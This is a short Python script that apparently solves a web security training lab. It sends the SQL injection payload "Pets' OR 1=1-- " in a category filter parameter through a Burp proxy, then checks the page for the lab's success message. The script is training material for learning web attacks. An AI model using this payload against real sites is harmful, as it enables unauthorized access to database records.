"""
Don't forgot enable the burp app
"""
import sys
import time
import logging
import argparse
import urllib3 #25 line ->

import requests

PROXIES = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080",
}
log = logging.getLogger(__name__) #Ч : Создаёт логгер с именем текущего модуля (файла).
logging.basicConfig(
    stream=sys.stdout, #Логи выводятся в стандартный вывод (терминал).
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Removes warnings about insecure HTTPS connections


def parse_args(args: list):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    )
    parser.add_argument("url", help="url of lab")
    return parser.parse_args()

def normalize_url(url):
    if not url.endswith("/"):
        url = url + "/"
    return url

def is_solved(url, no_proxy):
    def retrieve_contents(url, no_proxy): 
        log.info("Checking if solved.")
        if no_proxy:
            resp = requests.get(url)
        else:
            resp = requests.get(url, proxies=PROXIES, verify=False)
        if "Congratulations, you solved the lab!" in resp.text:
            log.info("Lab is solved!")
            return True
        
    solved = retrieve_contents(url, no_proxy)
    if solved:
        return True
    else:
        time.sleep(2)
        retrieve_contents(url, no_proxy)
        
def main(args):
    url = normalize_url(args.url)
    exploit_url = url + "filter?category=Pets' OR 1=1-- "
    log.info(f"getting url {exploit_url}")
    if args.no_proxy:
        resp = requests.get(exploit_url)
    else:
        resp = requests.get(exploit_url, proxies=PROXIES, verify=False)
    solved = False
    if resp.status_code == 200:
        solved = is_solved(url, args.no_proxy)
    if solved:
        log.info("Congrats!")
    else:
        log.info("Not Solved:(.")

if __name__ == "__main__":
    args = parse_args(sys.argv)
    main(args)
